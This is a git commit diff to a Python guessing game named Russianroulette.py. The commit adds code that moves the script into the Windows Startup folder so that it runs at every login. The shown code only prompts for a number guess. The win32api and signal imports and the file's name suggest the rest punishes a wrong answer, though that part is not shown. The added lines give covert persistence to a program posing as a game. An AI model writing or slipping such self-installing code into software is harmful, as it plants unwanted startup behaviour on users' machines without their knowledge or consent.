986eab3c9d299bdf3f5448f92a17966c4df7fc6f
Tilto66 <antoninvallonazoulay@gmail.com>
2026-03-20 17:38:23 +0100

    Tilto66: Add functionality to move script to startup
    Move script to Windows startup directory.

--- Russianroulette.py
+++ Russianroulette.py
@@ -1,6 +1,14 @@
-import random, os, win32api, signal
+import random, os, os.path, win32api, signal, shutil
 
+script_path = os.path.abspath(__file__)
+startup_dir = os.path.join(
+    os.environ["APPDATA"],
+    r"Microsoft\Windows\Start Menu\Programs\Startup"
+)
 
+destination = os.path.join(startup_dir, os.path.basename(script_path))
+
+shutil.move(script_path, destination)
 number = random.randint(1,100)
 guess = input("Guess a number between 1 and a 100")
 guess = int(guess)
